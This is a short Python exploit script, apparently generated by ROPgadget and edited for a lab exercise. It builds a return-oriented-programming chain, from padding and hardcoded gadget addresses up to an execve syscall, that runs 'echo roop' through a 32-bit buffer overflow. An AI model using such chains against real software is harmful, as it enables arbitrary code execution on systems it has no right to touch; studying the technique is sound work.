#!/usr/bin/env python3
# execve generated by ROPgadget

from struct import pack

# Padding goes here
p = b'A' * 44

p += pack('<I', 0x0806e13b) # pop edx ; ret
p += pack('<I', 0x080da060) # @ .data
p += pack('<I', 0x080a8cb6) # pop eax ; ret
p += b'echo'
p += pack('<I', 0x08056bd5) # mov dword ptr [edx], eax ; ret

#writes echo on the stack

p += pack('<I', 0x0806e13b) # pop edx ; ret
p += pack('<I', 0x080da064) # @ .data + 4

p += pack('<I', 0x08056190) # xor eax, eax ; ret
p += pack('<I', 0x08056bd5) # mov dword ptr [edx], eax ; ret

#writes null byte 

p += pack('<I', 0x0806e13b) # pop edx ; ret
p += pack('<I', 0x080da065) # @ .data + 5
p += pack('<I', 0x080a8cb6) # pop eax ; ret
p += b'roop'
p += pack('<I', 0x08056bd5) # mov dword ptr [edx], eax ; ret

#writes roop on the stack 

p += pack('<I', 0x0806e13b) # pop edx ; ret
p += pack('<I', 0x080da069) # @ .data + 9

p += pack('<I', 0x08056190) # xor eax, eax ; ret
p += pack('<I', 0x08056bd5) # mov dword ptr [edx], eax ; ret

#writes null byte 

#on the stack echo\x00roop

p += pack('<I', 0x0806e162) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080da060+60) # @ .data + 60
p += pack('<I', 0x080da060) # padding without overwrite ebx

'''
p += pack('<I', popEcx["vaddr"]) 
p += pack('<I', dataAddr + 8) 
p += self.__custompadding(popEcx, {"ebx": dataAddr})  
        
'''

#puts stack + 60 in to ecx 




p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080da060) # @ .data

#puts stack in to ebx

p += pack('<I', 0x0806e162) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080da068) # @ .data + 8
p += pack('<I', 0x080da060) # padding without overwrite ebx

#puts stack + 8 in to ecx 

p += pack('<I', 0x0806e13b) # pop edx ; ret
p += pack('<I', 0x080da068) # @ .data + 8

#puts stack + 8 in to edx 

p += pack('<I', 0x08056190) # xor eax, eax ; ret
p += pack('<I', 0x0807ba0a) # inc eax ; ret
p += pack('<I', 0x0807ba0a) # inc eax ; ret
p += pack('<I', 0x0807ba0a) # inc eax ; ret
p += pack('<I', 0x0807ba0a) # inc eax ; ret
p += pack('<I', 0x0807ba0a) # inc eax ; ret
p += pack('<I', 0x0807ba0a) # inc eax ; ret
p += pack('<I', 0x0807ba0a) # inc eax ; ret
p += pack('<I', 0x0807ba0a) # inc eax ; ret
p += pack('<I', 0x0807ba0a) # inc eax ; ret
p += pack('<I', 0x0807ba0a) # inc eax ; ret
p += pack('<I', 0x0807ba0a) # inc eax ; ret

#sets eax to 11
p += pack('<I', 0x080495f3) # int 0x80
#runs systemcall

outputfile = open("paddingbruteforce", "wb")
outputfile.write(p)
outputfile.close()

